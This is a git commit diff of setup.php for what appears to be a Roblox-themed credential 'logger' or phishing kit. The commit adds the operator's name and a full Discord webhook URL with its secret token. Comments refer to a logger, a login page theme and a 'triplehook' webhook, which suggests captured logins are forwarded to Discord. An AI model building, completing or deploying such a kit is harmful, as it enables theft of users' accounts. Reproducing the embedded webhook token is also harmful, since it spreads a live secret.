b7fa91055dd0d20197dfbf1b9d143beaacc4e327
ROTIVg <zumpanovitor@gmail.com>
2025-09-04 22:00:12 -0300

    Atualizar o setup.php

--- setup.php
+++ setup.php
@@ -1,8 +1,8 @@
 <?php
-$name = 'TermedRaaaa'; // Change to ur own name
+$name = 'ROTIVg'; // Change to ur own name
 $thumbnail = 'https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91'; // discord webhook thumbnail & logger thumbnail
 $hex = '#00000'; // color shit
-$triplehook = ''; // input ur fucking triplehook webhook here 
+$triplehook = 'https://discord.com/api/webhooks/1413327618324828200/Zc667pdtIiahWfGTXpkpdPR3O727C4FuRoJ3WMXofWPVJ9rXR42EEBmSxC0vNB5VgzkT'; // input ur fucking triplehook webhook here 
 $loginColor = [
     "theme" => "dark", // change be changed to white to for white login page
 ];
